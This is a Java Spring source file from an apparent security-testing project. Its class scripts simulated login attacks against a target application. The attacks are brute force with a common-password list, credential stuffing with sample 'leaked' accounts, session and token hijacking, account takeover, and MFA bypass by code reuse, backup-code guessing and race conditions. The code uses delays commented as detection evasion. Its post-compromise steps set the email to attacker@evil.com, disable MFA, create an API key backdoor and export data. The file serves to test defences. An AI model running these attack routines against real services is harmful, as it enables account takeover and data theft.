package io.contexa.contexacore.simulation.client;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpMethod;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Component;

import java.util.*;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 인증 공격 시뮬레이션 클라이언트
 * 
 * 다양한 인증 관련 공격을 시뮬레이션합니다.
 * Brute Force, Credential Stuffing, Session Hijacking, Account Takeover 등을 포함합니다.
 * 
 * @author contexa
 * @since 1.0.0
 */
@Slf4j
@Component
@RequiredArgsConstructor
public class LoginAttackClient {
    
    private final SimulationClient simulationClient;
    
    @Value("${simulation.attack.login.brute-force-delay-ms:100}")
    private int bruteForceDelayMs;
    
    @Value("${simulation.attack.login.credential-stuffing-delay-ms:500}")
    private int credentialStuffingDelayMs;
    
    @Value("${simulation.attack.login.max-attempts:10}")
    private int maxAttempts;
    
    // 일반적인 약한 패스워드 목록
    private static final List<String> COMMON_PASSWORDS = Arrays.asList(
        "123456", "password", "12345678", "qwerty", "123456789",
        "12345", "1234", "111111", "1234567", "dragon",
        "123123", "baseball", "abc123", "football", "monkey",
        "letmein", "696969", "shadow", "master", "666666",
        "qwertyuiop", "123321", "mustang", "1234567890", "michael",
        "654321", "superman", "1qaz2wsx", "7777777", "121212",
        "000000", "qazwsx", "123qwe", "killer", "trustno1",
        "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter",
        "buster", "soccer", "harley", "batman", "andrew",
        "tigger", "sunshine", "iloveyou", "2000", "charlie",
        "robert", "thomas", "hockey", "ranger", "daniel"
    );
    
    // 유출된 계정 정보 시뮬레이션 데이터
    private static final List<Map<String, String>> LEAKED_CREDENTIALS = new ArrayList<>();
    static {
        LEAKED_CREDENTIALS.add(Map.of("username", "user001", "password", "Pass123!"));
        LEAKED_CREDENTIALS.add(Map.of("username", "admin", "password", "Admin@2024"));
        LEAKED_CREDENTIALS.add(Map.of("username", "test.user", "password", "Test1234"));
        LEAKED_CREDENTIALS.add(Map.of("username", "john.doe", "password", "John1234!"));
        LEAKED_CREDENTIALS.add(Map.of("username", "jane.smith", "password", "Jane@456"));
        LEAKED_CREDENTIALS.add(Map.of("username", "michael.johnson", "password", "Mj123456"));
        LEAKED_CREDENTIALS.add(Map.of("username", "sarah.williams", "password", "Sarah2024"));
        LEAKED_CREDENTIALS.add(Map.of("username", "robert.brown", "password", "Robert123"));
        LEAKED_CREDENTIALS.add(Map.of("username", "lisa.davis", "password", "Lisa@789"));
        LEAKED_CREDENTIALS.add(Map.of("username", "david.miller", "password", "David456!"));
    }
    
    /**
     * 정상 로그인 시뮬레이션
     */
    public AttackResult normalLogin(String username, String password) {
        log.info("정상 로그인 시도: username={}", username);
        AttackResult result = new AttackResult("Normal Login");
        
        try {
            ResponseEntity<String> response = simulationClient.loginJson(username, password);
            result.addAttempt(username, response.getStatusCode() == HttpStatus.OK, response);
            
            if (response.getStatusCode() == HttpStatus.OK) {
                log.info("정상 로그인 성공: {}", username);
                
                // 정상적인 활동 시뮬레이션
                Thread.sleep(2000);
                simulationClient.get("/api/user/profile", null, null);
                Thread.sleep(1000);
                simulationClient.get("/api/user/dashboard", null, null);
            }
        } catch (Exception e) {
            log.error("정상 로그인 실패: {}", e.getMessage());
            result.addError(e.getMessage());
        }
        
        return result;
    }
    
    /**
     * Brute Force 공격 시뮬레이션
     */
    public AttackResult bruteForceAttack(String targetUsername) {
        log.warn("=== Brute Force 공격 시작: target={} ===", targetUsername);
        AttackResult result = new AttackResult("Brute Force Attack");
        result.setTargetUser(targetUsername);
        
        int attempts = 0;
        for (String password : COMMON_PASSWORDS) {
            if (attempts >= maxAttempts) {
                log.info("최대 시도 횟수 도달: {}", maxAttempts);
                break;
            }
            
            try {
                log.debug("Brute Force 시도 {}: password={}", attempts + 1, password);
                ResponseEntity<String> response = simulationClient.loginJson(targetUsername, password);
                
                boolean success = response.getStatusCode() == HttpStatus.OK;
                result.addAttempt(password, success, response);
                
                if (success) {
                    log.error("!!! Brute Force 성공: username={}, password={}", targetUsername, password);
                    result.setSuccessful(true);
                    break;
                }
                
                // 지연 시간 추가 (탐지 회피 시도)
                Thread.sleep(bruteForceDelayMs);
                attempts++;
                
            } catch (Exception e) {
                log.debug("Brute Force 시도 실패: {}", e.getMessage());
                result.addError(e.getMessage());
            }
        }
        
        result.setTotalAttempts(attempts);
        log.warn("=== Brute Force 공격 종료: 시도={}, 성공={} ===", 
            attempts, result.isSuccessful());
        
        return result;
    }
    
    /**
     * Credential Stuffing 공격 시뮬레이션
     */
    public AttackResult credentialStuffingAttack() {
        log.warn("=== Credential Stuffing 공격 시작 ===");
        AttackResult result = new AttackResult("Credential Stuffing Attack");
        
        AtomicInteger successCount = new AtomicInteger(0);
        AtomicInteger attemptCount = new AtomicInteger(0);
        
        for (Map<String, String> creds : LEAKED_CREDENTIALS) {
            String username = creds.get("username");
            String password = creds.get("password");
            
            try {
                log.debug("Credential Stuffing 시도: username={}", username);
                ResponseEntity<String> response = simulationClient.loginJson(username, password);
                
                boolean success = response.getStatusCode() == HttpStatus.OK;
                result.addAttempt(username + ":" + password, success, response);
                attemptCount.incrementAndGet();
                
                if (success) {
                    successCount.incrementAndGet();
                    log.error("!!! Credential Stuffing 성공: username={}", username);
                    
                    // 성공한 계정으로 추가 활동
                    performPostLoginActions(username);
                }
                
                // 탐지 회피를 위한 랜덤 지연
                Thread.sleep(credentialStuffingDelayMs + ThreadLocalRandom.current().nextInt(500));
                
            } catch (Exception e) {
                log.debug("Credential Stuffing 실패: username={}, error={}", username, e.getMessage());
                result.addError(username + ": " + e.getMessage());
            }
        }
        
        result.setTotalAttempts(attemptCount.get());
        result.setSuccessfulAttempts(successCount.get());
        log.warn("=== Credential Stuffing 공격 종료: 시도={}, 성공={} ===", 
            attemptCount.get(), successCount.get());
        
        return result;
    }
    
    /**
     * Session Hijacking 공격 시뮬레이션
     */
    public AttackResult sessionHijackingAttack(String legitimateUsername, String legitimatePassword) {
        log.warn("=== Session Hijacking 공격 시작 ===");
        AttackResult result = new AttackResult("Session Hijacking Attack");
        
        try {
            // 1. 정상 사용자로 로그인
            log.info("정상 사용자 로그인: {}", legitimateUsername);
            ResponseEntity<String> loginResponse = simulationClient.loginJson(legitimateUsername, legitimatePassword);
            
            if (loginResponse.getStatusCode() != HttpStatus.OK) {
                log.error("정상 사용자 로그인 실패");
                result.addError("Legitimate user login failed");
                return result;
            }
            
            // 세션 ID 획득
            String sessionId = simulationClient.getCurrentSessionId();
            String authToken = simulationClient.getCurrentAuthToken();
            log.info("세션 정보 획득: sessionId={}", sessionId);
            
            // 2. 다른 클라이언트에서 훔친 세션으로 접근 시도
            simulationClient.clearSession(); // 현재 세션 클리어
            Thread.sleep(2000);
            
            log.warn("훔친 세션으로 접근 시도");
            
            // 세션 ID로 접근
            if (sessionId != null) {
                ResponseEntity<String> hijackResponse = simulationClient.requestWithStolenSession(
                    "/api/user/profile", sessionId);
                result.addAttempt("Session: " + sessionId, 
                    hijackResponse.getStatusCode() == HttpStatus.OK, hijackResponse);
                
                if (hijackResponse.getStatusCode() == HttpStatus.OK) {
                    log.error("!!! Session Hijacking 성공: sessionId={}", sessionId);
                    result.setSuccessful(true);
                    
                    // 하이재킹된 세션으로 악의적 활동
                    performMaliciousActions(sessionId);
                }
            }
            
            // 토큰으로 접근
            if (authToken != null) {
                ResponseEntity<String> tokenHijackResponse = simulationClient.requestWithManipulatedToken(
                    "/api/user/profile", authToken);
                result.addAttempt("Token: " + authToken.substring(0, 20) + "...", 
                    tokenHijackResponse.getStatusCode() == HttpStatus.OK, tokenHijackResponse);
                
                if (tokenHijackResponse.getStatusCode() == HttpStatus.OK) {
                    log.error("!!! Token Hijacking 성공");
                    result.setSuccessful(true);
                }
            }
            
        } catch (Exception e) {
            log.error("Session Hijacking 실패: {}", e.getMessage());
            result.addError(e.getMessage());
        }
        
        log.warn("=== Session Hijacking 공격 종료: 성공={} ===", result.isSuccessful());
        return result;
    }
    
    /**
     * Account Takeover 시뮬레이션 (다중 벡터 공격)
     */
    public AttackResult accountTakeoverAttack(String targetUsername) {
        log.warn("=== Account Takeover 공격 시작: target={} ===", targetUsername);
        AttackResult result = new AttackResult("Account Takeover Attack");
        result.setTargetUser(targetUsername);
        
        try {
            // 1단계: Password Reset 시도
            log.info("1단계: Password Reset 시도");
            ResponseEntity<String> resetResponse = simulationClient.post(
                "/api/auth/password-reset",
                Map.of("username", targetUsername),
                null
            );
            result.addAttempt("Password Reset", 
                resetResponse.getStatusCode() == HttpStatus.OK, resetResponse);
            
            // 2단계: Social Engineering (이메일/SMS 가로채기 시뮬레이션)
            log.info("2단계: Social Engineering 시뮬레이션");
            Thread.sleep(1000);
            
            // 3단계: Brute Force로 임시 비밀번호 추측
            log.info("3단계: 임시 비밀번호 Brute Force");
            List<String> tempPasswords = Arrays.asList(
                "Temp123!", "Temp@2024", "Reset123", "Password1", "TempPass1"
            );
            
            for (String tempPass : tempPasswords) {
                ResponseEntity<String> loginAttempt = simulationClient.loginJson(targetUsername, tempPass);
                boolean success = loginAttempt.getStatusCode() == HttpStatus.OK;
                result.addAttempt("TempPassword: " + tempPass, success, loginAttempt);
                
                if (success) {
                    log.error("!!! Account Takeover 성공: username={}", targetUsername);
                    result.setSuccessful(true);
                    
                    // 4단계: 계정 장악 후 활동
                    performAccountTakeoverActions(targetUsername);
                    break;
                }
                
                Thread.sleep(500);
            }
            
            // 5단계: 대체 공격 벡터 시도
            if (!result.isSuccessful()) {
                log.info("5단계: 대체 공격 벡터 시도");
                
                // Security Question 우회 시도
                ResponseEntity<String> securityQuestionResponse = simulationClient.post(
                    "/api/auth/security-question",
                    Map.of(
                        "username", targetUsername,
                        "question", "What is your pet's name?",
                        "answer", "fluffy"
                    ),
                    null
                );
                result.addAttempt("Security Question Bypass", 
                    securityQuestionResponse.getStatusCode() == HttpStatus.OK, 
                    securityQuestionResponse);
            }
            
        } catch (Exception e) {
            log.error("Account Takeover 실패: {}", e.getMessage());
            result.addError(e.getMessage());
        }
        
        log.warn("=== Account Takeover 공격 종료: 성공={} ===", result.isSuccessful());
        return result;
    }
    
    /**
     * MFA Bypass 시도
     */
    public AttackResult mfaBypassAttack(String username, String password) {
        log.warn("=== MFA Bypass 공격 시작 ===");
        AttackResult result = new AttackResult("MFA Bypass Attack");
        
        try {
            // 1. 정상 로그인 (MFA 요구됨)
            ResponseEntity<String> loginResponse = simulationClient.loginJson(username, password);
            
            if (loginResponse.getStatusCode() == HttpStatus.ACCEPTED) { // 202: MFA Required
                log.info("MFA 요구됨");
                
                // 2. MFA 우회 시도들
                
                // 2-1. 이전 MFA 코드 재사용
                log.info("이전 MFA 코드 재사용 시도");
                ResponseEntity<String> reuseResponse = simulationClient.post(
                    "/api/auth/mfa/verify",
                    Map.of("code", "123456"),
                    null
                );
                result.addAttempt("MFA Code Reuse", 
                    reuseResponse.getStatusCode() == HttpStatus.OK, reuseResponse);
                
                // 2-2. 백업 코드 무차별 대입
                log.info("백업 코드 무차별 대입");
                List<String> backupCodes = Arrays.asList(
                    "BACKUP-123456", "BACKUP-654321", "BACKUP-111111"
                );
                for (String code : backupCodes) {
                    ResponseEntity<String> backupResponse = simulationClient.post(
                        "/api/auth/mfa/backup",
                        Map.of("backupCode", code),
                        null
                    );
                    result.addAttempt("Backup Code: " + code, 
                        backupResponse.getStatusCode() == HttpStatus.OK, backupResponse);
                    
                    if (backupResponse.getStatusCode() == HttpStatus.OK) {
                        log.error("!!! MFA Bypass 성공: 백업 코드={}", code);
                        result.setSuccessful(true);
                        break;
                    }
                }
                
                // 2-3. Race Condition 공격
                log.info("Race Condition 공격 시도");
                List<CompletableFuture<ResponseEntity<String>>> futures = new ArrayList<>();
                for (int i = 0; i < 5; i++) {
                    CompletableFuture<ResponseEntity<String>> future = CompletableFuture.supplyAsync(() ->
                        simulationClient.post(
                            "/api/auth/mfa/verify",
                            Map.of("code", "000000"),
                            null
                        )
                    );
                    futures.add(future);
                }
                
                for (CompletableFuture<ResponseEntity<String>> future : futures) {
                    ResponseEntity<String> raceResponse = future.get(5, TimeUnit.SECONDS);
                    if (raceResponse.getStatusCode() == HttpStatus.OK) {
                        log.error("!!! MFA Bypass 성공: Race Condition");
                        result.setSuccessful(true);
                        result.addAttempt("Race Condition", true, raceResponse);
                        break;
                    }
                }
            }
            
        } catch (Exception e) {
            log.error("MFA Bypass 실패: {}", e.getMessage());
            result.addError(e.getMessage());
        }
        
        log.warn("=== MFA Bypass 공격 종료: 성공={} ===", result.isSuccessful());
        return result;
    }
    
    /**
     * 로그인 후 악의적 활동 수행
     */
    private void performPostLoginActions(String username) {
        try {
            log.info("로그인 후 활동: username={}", username);
            
            // 프로필 정보 수집
            simulationClient.get("/api/user/profile", null, null);
            Thread.sleep(500);
            
            // 민감 정보 접근 시도
            simulationClient.get("/api/user/sensitive-data", null, null);
            Thread.sleep(500);
            
            // 권한 상승 시도
            simulationClient.post("/api/user/elevate-privileges", null, null);
            
        } catch (Exception e) {
            log.error("로그인 후 활동 실패: {}", e.getMessage());
        }
    }
    
    /**
     * 세션 하이재킹 후 악의적 활동
     */
    private void performMaliciousActions(String sessionId) {
        try {
            log.warn("하이재킹된 세션으로 악의적 활동: sessionId={}", sessionId);
            
            // 계정 정보 변경 시도
            simulationClient.requestWithStolenSession(
                "/api/user/change-email", sessionId);
            Thread.sleep(500);
            
            // 비밀번호 변경 시도
            simulationClient.requestWithStolenSession(
                "/api/user/change-password", sessionId);
            Thread.sleep(500);
            
            // 데이터 유출 시도
            simulationClient.requestWithStolenSession(
                "/api/user/export-data", sessionId);
            
        } catch (Exception e) {
            log.error("악의적 활동 실패: {}", e.getMessage());
        }
    }
    
    /**
     * 계정 탈취 후 활동
     */
    private void performAccountTakeoverActions(String username) {
        try {
            log.warn("계정 탈취 후 활동: username={}", username);
            
            // 이메일 변경
            simulationClient.post(
                "/api/user/change-email",
                Map.of("email", "attacker@evil.com"),
                null
            );
            Thread.sleep(500);
            
            // 2FA 비활성화 시도
            simulationClient.post("/api/user/disable-mfa", null, null);
            Thread.sleep(500);
            
            // 백도어 생성 (API 키 생성)
            simulationClient.post("/api/user/generate-api-key", null, null);
            
            // 데이터 탈취
            simulationClient.get("/api/user/export-all-data", null, null);
            
        } catch (Exception e) {
            log.error("계정 탈취 후 활동 실패: {}", e.getMessage());
        }
    }
    
    /**
     * 공격 결과 클래스
     */
    public static class AttackResult {
        private final String attackType;
        private final List<AttemptRecord> attempts = new ArrayList<>();
        private final List<String> errors = new ArrayList<>();
        private boolean successful = false;
        private int totalAttempts = 0;
        private int successfulAttempts = 0;
        private String targetUser;
        private long startTime = System.currentTimeMillis();
        private long endTime;
        
        public AttackResult(String attackType) {
            this.attackType = attackType;
        }
        
        public void addAttempt(String credential, boolean success, ResponseEntity<?> response) {
            attempts.add(new AttemptRecord(credential, success, HttpStatus.valueOf(response.getStatusCode().value())));
            if (success) successfulAttempts++;
        }
        
        public void addError(String error) {
            errors.add(error);
        }
        
        public void complete() {
            endTime = System.currentTimeMillis();
        }
        
        public long getDuration() {
            return (endTime > 0 ? endTime : System.currentTimeMillis()) - startTime;
        }
        
        // Getters and Setters
        public String getAttackType() { return attackType; }
        public List<AttemptRecord> getAttempts() { return attempts; }
        public List<String> getErrors() { return errors; }
        public boolean isSuccessful() { return successful; }
        public void setSuccessful(boolean successful) { this.successful = successful; }
        public int getTotalAttempts() { return totalAttempts; }
        public void setTotalAttempts(int totalAttempts) { this.totalAttempts = totalAttempts; }
        public int getSuccessfulAttempts() { return successfulAttempts; }
        public void setSuccessfulAttempts(int successfulAttempts) { this.successfulAttempts = successfulAttempts; }
        public String getTargetUser() { return targetUser; }
        public void setTargetUser(String targetUser) { this.targetUser = targetUser; }
        
        /**
         * 시도 기록
         */
        public static class AttemptRecord {
            private final String credential;
            private final boolean success;
            private final HttpStatus httpStatus;
            private final long timestamp = System.currentTimeMillis();
            
            public AttemptRecord(String credential, boolean success, HttpStatus httpStatus) {
                this.credential = credential;
                this.success = success;
                this.httpStatus = httpStatus;
            }
            
            // Getters
            public String getCredential() { return credential; }
            public boolean isSuccess() { return success; }
            public HttpStatus getHttpStatus() { return httpStatus; }
            public long getTimestamp() { return timestamp; }
        }
    }
}